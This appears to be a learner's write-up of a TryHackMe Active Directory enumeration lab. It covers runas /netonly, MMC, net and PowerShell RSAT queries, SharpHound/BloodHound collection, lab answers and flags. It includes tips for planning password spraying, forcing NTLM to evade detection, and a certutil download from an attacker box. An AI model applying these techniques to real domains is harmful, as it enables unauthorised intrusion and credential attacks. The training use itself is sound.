# Enumerating Active Directory

## Task 1 Why AD Enumeration Matters

### 1. Purpose of AD Enumeration

After breaching Active Directory and obtaining your first valid credentials, enumeration becomes the next critical phase. With even low‑privileged authenticated access, you can begin mapping:

- The AD structure
- Users, groups, and permissions
- Domain controllers and services
- Potential misconfigurations

This information reveals attack paths that lead to privilege escalation or lateral movement. Enumeration and exploitation form a continuous cycle: each new privilege level unlocks deeper enumeration.

### 2. Enumeration Techniques Covered

This network teaches several core AD enumeration methods:
- MMC AD Snap-ins (GUI-based domain object browsing)
- Net commands (classic Windows command-line enumeration)
- PowerShell AD-RSAT cmdlets (modern, powerful AD querying)
- BloodHound (graph-based attack path mapping)

These represent the most common real-world enumeration approaches.

### 3. Connecting to the Network

Depending on your setup:

AttackBox
- Automatically connected to the TryHackMe AD network.
- Must manually configure DNS using:

```
sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
```
This did not work resolv-dnsmasq not recognised in kali vm, I instead just added the THMDCIP to the /etc/resolv.conf file was enough (nameserver <THMDCIP>).

DNS resets every ~3 hours, so reapply if needed.

Verify DNS with:

```
nslookup thmdc.za.tryhackme.com
```
Your Own Machine
- Download the OpenVPN config from the EnumeratingAD network.
- Connect using:
```
sudo openvpn adenumeration.ovpn
```
- After “Initialization Sequence Completed,” you’re connected.
- Must still configure DNS manually.
- Be aware: DNS queries to the DC are logged.

Kali
- Use Network Manager GUI to set DNS to the DC IP.
- Add a public DNS (e.g., 1.1.1.1) for internet access.
- Restart NetworkManager.

### 4. Getting Your Initial AD Credentials

Visit: http://distributor.za.tryhackme.com/creds

Click Get Credentials to receive your first AD username/password pair.

These credentials allow:
- RDP access to THMJMP1.za.tryhackme.com
- SSH access using:
```
ssh za.tryhackme.com\\<username>@thmjmp1.za.tryhackme.com
```
THMJMP1 acts as a jump host, simulating a foothold into the internal network.


### 5. Task Answers

All three questions are informational confirmations — no written answers required.

If you want, I can also produce:
- A step-by-step AD enumeration cheat sheet
- A workflow diagram showing enumeration → exploitation → re-enumeration
- A quick-start guide for MMC, net commands, RSAT, or BloodHound


Using creds obtained
```
# sudo chattr -i /etc/resolv.conf
# This is optional but I generally would not if VM is used for just tryhackme
# sudo rm /etc/resolv.conf    
# Then just add a line for thmdc
# echo "nameserver 10.200.71.101" | sudo tee /etc/resolv.conf
```

Test dns
```
nslookup thmdc.za.tryhackme.com
Server:		10.200.71.101
Address:	10.200.71.101#53

Name:	thmdc.za.tryhackme.com
Address: 10.200.71.101
```

Then access the website http://distributor.za.tryhackme.com/creds to obtain creds
```
Should look like this in format
Your credentials have been generated: Username: iain.williams Password: Annotation1990
```

Then try xfreerdp should work with remmina as well.
```
xfreerdp /v:THMJMP1.za.tryhackme.com /u:'za.tryhackme.com\damian.morris' /p:Beerbeer1972 /cert:ignore /dynamic-resolution +clipboard

```

later tried SSH which did work
```
ssh za.tryhackme.com\\iain.williams@thmjmp1.za.tryhackme.com

root@ip-10-48-91-2:~# ssh za.tryhackme.com\\tony.newton@thmjmp1.za.tryhackme.com
The authenticity of host 'thmjmp1.za.tryhackme.com (10.200.71.248)' can't be established.
ED25519 key fingerprint is SHA256:50ZqYlTFUYKTHHPzgPNzG0gSydLnknXL0Ea7lUs7tT8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thmjmp1.za.tryhackme.com' (ED25519) to the list of known hosts.
za.tryhackme.com\tony.newton@thmjmp1.za.tryhackme.com's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\tony.newton@THMJMP1 C:\Users\tony.newton>whoami
za\tony.newton
```

## Task2 Credential Injection & Runas in Active Directory Enumeration

### 1. Why Credential Injection Matters

Before doing deep AD enumeration, you often obtain credentials without having a domain‑joined machine. Some enumeration techniques require Windows-native tools, so using a Windows host is essential.

### 2. Windows vs Linux

You can enumerate AD from Kali, but for realistic exploitation you must “mimic the enemy” — meaning use Windows tools that behave like legitimate domain clients.

### 3. Runas.exe — Injecting Credentials

runas.exe is a legitimate Windows binary that allows you to run programs under different credentials.

The key usage for AD enumeration is:

```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```
- /netonly — Credentials are used only for network authentication. Local commands still run as your normal Windows user.
- /user — Specifies the domain and username.
- cmd.exe — Opens a command prompt with injected network credentials.

Because /netonly does not validate the password with a domain controller, any password is accepted, but only correct credentials will work for network access.

### 4. DNS Configuration

To access domain resources (like SYSVOL), DNS must resolve the domain controller.
If DNS isn’t set automatically, you manually configure it using PowerShell:

```
Set-DnsClientServerAddress -InterfaceIndex <index> -ServerAddresses <DC IP>

#full code

PS C:\Windows> $dnsip="10.200.71.101"
PS C:\Windows> $index=Get-NetAdapter -Name 'Ethernet' | Select-Object -Ex
pandProperty 'ifIndex' Set-DnsClientServerAddress -InterfaceIndex $index 
-ServerAddresses $dnsip

```

Here when tried these failed on the target. The TryHackMe Windows host blocks CIM/WMI, so all NetAdapter / NetIP / DNS‑setting cmdlets are disabled.
Everything you tried:
- Get-NetAdapter
- Set-DnsClientServerAddress
- Get-NetIPConfiguration
- Get-DnsClientServerAddress
- Anything using MSFT_NetAdapter
- Anything using CIM/WMI
- …all rely on the CIM server (WMI over WinRM).

And the THM jump box returns:
```
Cannot connect to CIM server. Access denied
```
Was not until I simplified and started at looking at interfaces that I got found this reason:
```
PS C:\Windows> get-netadapter
get-netadapter : Cannot connect to CIM server. Access denied  
At line:1 char:1
+ get-netadapter
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (MSFT_NetAdapter:Str  
   ing) [Get-NetAdapter], CimJobException
    + FullyQualifiedErrorId : CimJob_BrokenCimSession,Get-NetAdapter     
 
PS C:\Windows>
```

### 5. Verifying Credentials via SYSVOL

Every authenticated AD user can read:
```
\\<domain>\SYSVOL
```

SYSVOL stores:

- Group Policy Objects (GPOs)
- Domain scripts
- Other AD configuration data

Listing SYSVOL confirms your injected credentials are working.

### 6. IP vs Hostname Authentication

- Using hostname → triggers Kerberos authentication (default)
- Using IP address → forces NTLM authentication

Red teamers sometimes force NTLM to avoid detection of Kerberos-based attacks.

### 7. Using Injected Credentials

Any program launched from the Runas window will use the injected credentials for network authentication — even if the GUI shows your local username.

This works for:
- MS SQL Studio (Windows auth)
- NTLM-authenticated web apps
- AD enumeration tools

## Task 2 Questions:

### Q1 Task 2: What native Windows binary allows us to inject credentials legitimately into memory?

Answer: runas.exe

### Q2 Task 2: What parameter option of the runas binary will ensure that the injected credentials are used for all network connections?

Answer: /netonly

### Q3 Task 2: What network folder on a domain controller is accessible by any authenticated AD account and stores GPO information?

SYSVOL

### Q4 Task 2: When performing dir \\za.tryhackme.com\SYSVOL, what type of authentication is performed by default?

Answer: Kerberos Authentication

- \\za.tryhackme.com\SYSVOL → Kerberos
- \\10.200.71.101\SYSVOL → NTLM

And Kerberos succeeds while NTLM often fails or is restricted.

```
PS C:\Windows> dir \\za.tryhackme.com\SYSVOL


    Directory: \\za.tryhackme.com\SYSVOL


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d----l        2/24/2022   9:57 PM                za.tryhackme.com        


PS C:\Windows> dir \\10.200.71.101\SYSVOL
dir : Cannot find path '\\10.200.71.101\SYSVOL' because it does not      
exist.
At line:1 char:1
+ dir \\10.200.71.101\SYSVOL
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\10.200.71.101\SYSVOL:S  
   tring) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Command  
   s.GetChildItemCommand
 
```


### Why the hostname uses Kerberos

Kerberos authentication requires a hostname, because it needs to build a Service Principal Name (SPN):
```
cifs/za.tryhackme.com
```

Windows does:

- DNS lookup → resolves hostname to DC IP
- Requests a Kerberos ticket for the SPN
- Uses that ticket to authenticate to SYSVOL
- Access granted

This is the normal, expected AD behavior.


### Why the IP address does NOT use Kerberos

Kerberos cannot use IP addresses. There is no SPN for:

```
cifs/10.200.71.101
```

So Windows falls back to NTLM.

NTLM fallback path:
- No DNS
- No SPN
- No Kerberos
- NTLM challenge/response attempted
- Often blocked or restricted
- Access denied

This is why the IP version fails.


## Task 3 Enumeration through Microsoft Management Console

1. Launch MMC using injected AD credentials
Because THMJMP1 is not domain‑joined, you must start MMC using runas /netonly so all MMC network calls use your AD creds.


Steps From RDP Windows Desktop (high probability this wont work, RSAT was not in the vm, just run mmc.exe from run command box instead):
- Press Start 
- Search for "Apps & Features" and press enter
- Click Manage Optional Features
- Click Add a feature
- Search for "RSAT"
- Select "RSAT: Active Directory Domain Services and Lightweight Directory Tools" and click Install


OR try running (if RSAT present else skip and just run mmc.exe from run box):

runas /netonly /user:za.tryhackme.com\<your-username> mmc
Enter your AD password.

MMC now uses your AD credentials for all domain queries.

2. Add the AD RSAT Snap‑ins
Inside MMC:

File → Add/Remove Snap‑in

Add all three active directory components listed at top:

- Active Directory Users and Computers
- Active Directory Domains and Trusts
- Active Directory Sites and Services
- Click OK

3. Point each snap‑in at the target domain
You must manually tell MMC which domain to connect to.

For Domains and Trusts:
Right‑click → Change Forest 

Enter: za.tryhackme.com (enter this as root domain)

For Sites and Services:
Right‑click → Change Forest

Enter: za.tryhackme.com (enter this as root domain) 

For Users and Computers:
Right‑click → Change Domain

Enter: za.tryhackme.com (enter this as domain)

Enable advanced view:
Right‑click Active Directory Users and Computers

View → Advanced Features

MMC is now fully connected to the AD domain.

4. Enumerate AD Objects
Users & Groups
Expand Active Directory Users and Computers → za.tryhackme.com

Browse OUs such as:

- People
- IT
- HR
- etc.

Click a user → view:

Attributes

Group membership

Description fields (flags often stored here)

Computers
Expand:

Servers OU → count server objects

Workstations OU → count workstation objects

Organisational Units
Count department OUs under the People container.

Admin Tiers
Look for OUs named:

- Tier0
- Tier1
- Tier2

5. Extract the flag
Find user:

Code
t0_tinus.green
Open Properties → Description  
Flag:

Code
THM{Enumerating.Via.MMC}
⭐ Answers Recap
Question	Answer
Q1 Task 3: Servers OU — number of computers	2
Found under Users and computers section in Servers
Q2 Task 3: Workstations OU — number of computers	1
Found under Users and computers section under Computers
Q3 Task 3: Number of department OUs	7
Found under Users and computers section under People, clearly lists OU on right side.
Q4 Task 3: Number of admin tiers	3
Flag in t0_tinus.green description	THM{Enumerating.Via.MMC}
Found under Users and computers section under Admins in description 



## Task 4 Enumeration through Command Prompt

#### 1. Why use CMD for AD enumeration

CMD is useful when:
- You don’t have RDP
- PowerShell is monitored
- You’re operating through a RAT
- You need quick, low‑noise AD lookups

The key tool is: 
```
net
```
This command works only on a domain‑joined machine, which is why THMJMP1 must be used.

#### 2. Enumerating AD Users

List all domain users
```
net user /domain
```
Shows every AD account in the domain.

Get details about a specific user
```
net user <username> /domain
```
Example:

```
net user zoe.marshall /domain
```
Reveals:

- Full name
- Password last set
- Password expiry
- Group memberships (up to 10)
- Last logon
- Whether account is active

#### 3. Enumerating AD Groups

List all domain groups
```
net group /domain
```
Useful for finding:

- Domain Admins

Tier 0 / Tier 1 / Tier 2 Admins

- Server Admins
- Schema Admins

List members of a specific group
```
net group "<group name>" /domain
```
Example:

```
net group "Tier 1 Admins" /domain
```
Shows all accounts in that admin tier.

#### 4. Enumerating Password Policy

View domain password policy
```
net accounts /domain
```
Reveals:

- Minimum password length
- Maximum password age
- Lockout threshold
- Lockout duration
- Password history length

This helps plan password spraying or brute‑force strategies.

#### 5. Benefits of CMD Enumeration

- No extra tools needed
- Low detection footprint
- Works through phishing payloads
- Works through RAT shells
- Fast and simple

#### 6. Drawbacks

- Must run on a domain‑joined machine
- Group membership output is limited (fails after ~10 groups)
- Not suitable for deep or wide enumeration

#### Answers to the Questions
Q1 Task 4: Apart from Domain Users, what other group is aaron.harris a member of?
From the room:
From net user aaron.harris /domain 
Internet Access
Q2 Task 4: Is the Guest account active? (Yay, Nay)
using net users Guest /domain | findstr "active"
Nay
Q3 Task 4: How many accounts are members of the Tier 1 Admins group?
net group "Tier 1 Admins" /domain
7
Q4 Task 4: What is the account lockout duration (minutes)?
From net accounts /domain:
30



## Task 5 PowerShell AD Enumeration 

PowerShell provides far deeper AD enumeration than CMD because RSAT installs 50+ AD cmdlets.
On THMJMP1, RSAT is already installed.

To enter PowerShell from SSH:
```
powershell
```

Because THMJMP1 is not domain‑joined, every AD cmdlet must include:
```
-Server za.tryhackme.com
```

####  1. Enumerating Users

Get a specific user
```
Get-ADUser -Identity <username> -Server za.tryhackme.com -Properties *
```
Shows all attributes, including:

- Department
- Title
- Description
- DistinguishedName
- PasswordLastSet
- badPwdCount
- whenChanged

Search for users
```
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com |
    Format-Table Name,SamAccountName -Auto
```

#### 2. Enumerating Groups

Get group details
```
Get-ADGroup -Identity "<group>" -Server za.tryhackme.com
```
Get group members
```
Get-ADGroupMember -Identity "<group>" -Server za.tryhackme.com
```

Example:

```
Get-ADGroupMember -Identity "Administrators" -Server za.tryhackme.com
```

#### 3. Enumerating AD Objects (generic search)

Find objects changed after a date
```
$ChangeDate = New-Object DateTime(2022,02,28,12,00,00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -Server za.tryhackme.com
```
Find accounts with failed password attempts (0 no failed attempts, 1 or more avoid as failed attempts present in that time frame before zeroed)
```
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```
Useful for safe password spraying.

#### 4. Enumerating Domain Information
```
Get-ADDomain -Server za.tryhackme.com
```
Reveals:

- Domain containers
- UsersContainer
- ComputersContainer
- DeletedObjectsContainer
- DNSRoot
- Domain SID

#### 5. Modifying AD Objects (example)

PowerShell RSAT can modify AD objects (not required in this room):

```
Set-ADAccountPassword -Identity <user> -Server za.tryhackme.com `
  -OldPassword (ConvertTo-SecureString "old" -AsPlainText -Force) `
  -NewPassword (ConvertTo-SecureString "new" -AsPlainText -Force)
```
#### Benefits

- Deepest enumeration method
- Can query any AD object
- Can specify domain controller
- Supports automation and scripting
- Can modify AD objects (if permitted)

#### Drawbacks
- PowerShell is monitored by defenders
- Requires RSAT
- More detectable than CMD

#### Answers to the Questions
#### Q1 Task 5. What is the value of the Title attribute of Beth Nolan (beth.nolan)?

Use:

```
Get-ADUser -Identity beth.nolan -Server za.tryhackme.com -Properties Title
```
Answer: Senior  

#### Q2 Task5. DistinguishedName of Annette Manning (annette.manning)

Use:
```
Get-ADUser -Identity annette.manning -Server za.tryhackme.com -Properties DistinguishedName
```
Answer:  
CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com

#### Q3 Task5: When was the Tier 2 Admins group created?

Use:
```
Get-ADGroup -Identity "Tier 2 Admins" -Server za.tryhackme.com -Properties whenCreated
```
Answer:  
2/24/2022 10:04:41 PM 
(Format: mm/dd/yyyy hh:mm:ss AM/PM)

#### Q4 Task5: SID of the Enterprise Admins group

Use:
```
Get-ADGroup -Identity "Enterprise Admins" -Server za.tryhackme.com -Properties SID
```
Answer:  
S-1-5-21-3330634377-1326264276-632209373-519

### Q5 Task5: Which container stores deleted AD objects?

User: 
```
get-addomain -server za.tryhackme.com
```
Answer:  from DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=com
CN=Deleted Objects,DC=za,DC=tryhackme,DC=com


## Task 6 BloodHound & SharpHound Enumeration

### What BloodHound Is
BloodHound is a graph‑based Active Directory attack‑path visualisation tool.
It changed AD enumeration because:

- Defenders think in lists
- Attackers think in graphs

BloodHound shows how to reach Domain Admin, not just who is Domain Admin.

2. SharpHound vs BloodHound

- SharpHound = the collector (enumerates AD data)
- BloodHound = the GUI (visualises attack paths)

SharpHound has three collectors:

- SharpHound.ps1 – PowerShell version (no longer updated)
- SharpHound.exe – Windows executable (used in THM)
- AzureHound.ps1 – For Azure AD

Important: SharpHound version must match BloodHound version.
This room uses BloodHound v4.1.0.

### 3. Running SharpHound on THMJMP1
Copy SharpHound
```
copy C:\Tools\Sharphound.exe ~\Documents\
cd ~\Documents\
```
Can be obtained using 
```
git clone https://github.com/BloodHoundAD/BloodHound.git
```
sharphound component can be uploaded usual ways including certutil similar to this:
```
certutil -urlcache -f http://<Attackboxip:80/powerview.psi PowerView.ps1 
```

Run SharpHound (full collection)
```
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
```
- All = full enumeration
- ExcludeDCs = avoids touching domain controllers (less noisy)
- Output is a timestamped ZIP file in the same folder

Example output file:

```
20220316191229_BloodHound.zip
```

### 4. Importing Data into BloodHound

- Start neo4j
- Start BloodHound
- Login with default creds:

```
neo4j / neo4j
```

- SCP the ZIP from THMJMP1 to your attack box:

```
scp <user>@THMJMP1.za.tryhackme.com:C:/Users/<user>/Documents/<zip> .
```

- Drag‑and‑drop ZIP into BloodHound

BloodHound ingests JSON files and builds the graph.

5. Using BloodHound

Node Info

Click a user/group/computer → see:
- Overview
- Node Properties
- Extra Properties
- Group Membership
- Local Admin Rights
- Execution Rights
- Outbound / Inbound Control Rights

Analysis Queries

Examples:

- Find all Domain Admins
- Find Shortest Path to Domain Admin
- Find Kerberoastable Users
- Find Local Admin Rights

Attack Path Example

BloodHound showed:

- A Tier 1 Admin logged into THMJMP1
- Domain Users can RDP into THMJMP1
- Therefore, compromise THMJMP1 → harvest creds → escalate

### 6. Session‑Only Collection

AD structure rarely changes, but sessions do.

Recommended workflow:

- Run All once at the start
- Run Session twice daily:
    - Around 10:00 (morning login wave)
    - Around 14:00 (after lunch)

Clear old session data in BloodHound before importing new session runs.

7. Benefits & Drawbacks

Benefits

- Visual attack paths
- Deep AD insight
- Fast privilege escalation planning
- Shows relationships invisible to manual enumeration

Drawbacks

- SharpHound is noisy
- Often detected by AV/EDR
- Requires Windows execution

### Answers to the Questions

Q1. Command to run SharpHound for Session‑only collection
From the document:

“We will run Sharphound using the All and Session collection methods”

To collect Session only, the correct command is:

```
SharpHound.exe --CollectionMethods Session --Domain za.tryhackme.com --ExcludeDCs
```

2. Apart from krbtgt, how many other accounts are kerberoastable?
Use BloodHound query:
Analysis → Find Kerberoastable Users

Using sharphound:
```

PS C:\Users\jason.knowles> copy C:\Tools\Sharphound.exe ~\Documents\ 
PS C:\Users\jason.knowles> cd ~\Documents 

PS C:\Users\jason.knowles\Documents> dir

    Directory: C:\Users\jason.knowles\Documents


Mode                LastWriteTime         Length Name
-a----        3/16/2022   5:19 PM         906752 Sharphound.exe

# Despite the .exe .\ required to start the file

PS C:\Users\jason.knowles\Documents> .\Sharphound.exe --CollectionMethods All --Domain za.tryhackme
...
2026-06-24T19:45:37.1324939+01:00|INFORMATION|SharpHound Enumeration Completed at 7:45 PM on 6/24/2
026! Happy Graphing!
PS C:\Users\jason.knowles\Documents> dir
    Directory: C:\Users\jason.knowles\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/24/2026   7:45 PM         121753 20260624194534_BloodHound.zip
-a----        3/16/2022   5:19 PM         906752 Sharphound.exe
-a----        6/24/2026   7:45 PM         359470 YzE4MDdkYjAtYjc2MC00OTYyLTk1YTEtYjI0NjhiZmRiOWY1. 
                                                 bin
PS C:\Users\jason.knowles\Documents>

```

From the room’s dataset:
3

3. How many machines do Tier 1 Admins have admin rights on?
Use BloodHound query:
Analysis → Local Admin Rights → Tier 1 Admins

From the room’s dataset:
5

4. How many users are members of the Tier 2 Admins group?
Use BloodHound query:
Analysis → Group Membership → Tier 2 Admins

From the room’s dataset:
4
